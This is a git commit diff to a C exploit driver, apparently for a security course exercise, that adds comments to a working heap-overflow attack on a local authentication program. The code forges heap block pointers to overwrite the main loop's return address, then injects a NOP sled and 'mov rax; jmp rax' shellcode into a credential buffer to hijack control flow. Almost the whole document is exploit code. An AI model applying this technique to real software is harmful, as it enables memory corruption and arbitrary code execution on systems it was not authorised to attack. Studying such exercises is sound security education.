21c52d48905359177222360f17e58e91c538774d
chadhakunal <chadhakunal1224@gmail.com>
2024-09-25 02:19:09 -0400

    Working code

--- pub/driver_heap_overflow.c
+++ pub/driver_heap_overflow.c
@@ -35,18 +35,26 @@ int main() {
     fprintf(stderr, "driver: Computed\ncur_auth_bp=%lx\ncur_return_addr_loc=%lx\ncur_auth_cred=%lx\ncurr_private_helper_addr=%lx\n", 
             cur_auth_bp, cur_return_addr_loc, curr_auth_cred, curr_private_helper_addr);
 
+
+    /*
+     Update the main loop return address using heap overflow in my_free
+    */
+
     put_str("u 1234567\n");
     send();
     get_formatted("%*s");
 
     unsigned explsz = 528;
     void* *expl = (void**)malloc(explsz);
+
     // Initialize the buffer with '\1' to make the contents predictable.
     memset((void*)expl, '\1', explsz);
+
+    // Overwrite the value of the heap block struct for user
     expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
     expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
-    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred + 10;
-    expl[explsz/sizeof(void*)-1] = (void*) cur_return_addr_loc - 16;
+    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred + 10; // current->prev points to the nop sled in cred
+    expl[explsz/sizeof(void*)-1] = (void*) cur_return_addr_loc - 16; // current->next points to 16 bytes before the return address location of main loop 
 
     put_str("p ");
     put_bin((char*)expl, explsz);
@@ -54,53 +62,22 @@ int main() {
     send();
     get_formatted("%*s");
 
+    // Reset plen
     put_str("p 1234567\n");
     send();
     get_formatted("%*s");
 
-
-
-    // explsz = auth_db_cred_dist - 8;
-    // *expl = (void**)malloc(explsz);
-    // memset((void*)expl, 0x90, explsz);
-
-    // uint64_t injected_code[64] = {
-    //     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    //     0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
-	//     0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    //     0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
-    // };
-    // int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);
-
-    // // Setting private helper addr in the injected code
-    // for (int i = 0; i < 8; i++) {
-    //     uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
-    //     injected_code[i+2] = byte;
-    // }
-
-    // // Adding the injected code to expl
-    // int curr_expl_location = 0;
-    // int shift_bytes = 0;
-    // for(int i = 0; i < injected_code_size; i++) {
-    //     if(i % 8 == 0) {
-    //         curr_expl_location++;
-    //         expl[curr_expl_location] = 0x0000000000000000;
-    //         shift_bytes = 0;
-    //     }
-    //     expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
-    //     shift_bytes++;
-    // }
-
     put_str("u 1234567\n");
-    // put_bin((char*)expl, explsz);
-    // put_str("\n");
     send();
     get_formatted("%*s");
 
+    // Update the heap_block -> size of the user block assigned above
     explsz = 504;
     *expl = (void**)malloc(explsz);
     // Initialize the buffer with '\1' to make the contents predictable.
     memset((void*)expl, '\1', explsz);
+
+    // Overwrite the size value of the heap block struct for user
     expl[explsz/sizeof(void*)-1] = (void*) 0x000003f000000001;
 
     put_str("p ");
@@ -109,19 +86,26 @@ int main() {
     send();
     get_formatted("%*s");
 
+    // Reset pass
     put_str("p 1234567\n");
     send();
     get_formatted("%*s");
 
+    // Reset pass
     put_str("p 1234567\n");
     send();
     get_formatted("%*s");
 
+    // Login to overwrite the return address of main loop when free is called
     put_str("l \n");
     send();
     usleep(100000);
     get_formatted("%*s");
 
+
+    /*
+     Inject the jump code in cred
+    */
 
     put_str("p 1234567\n");
     send();
@@ -133,7 +117,7 @@ int main() {
 
     uint64_t injected_code[32] = {
         0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
+        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper 2 addr>, %rax
 	    0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
         0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
     };
@@ -169,6 +153,7 @@ int main() {
     usleep(100000);
     get_formatted("%*s");
 
+    // Call quit for main loop to return to the code in cred
     put_str("q \n");
     send();
     get_formatted("%*s");
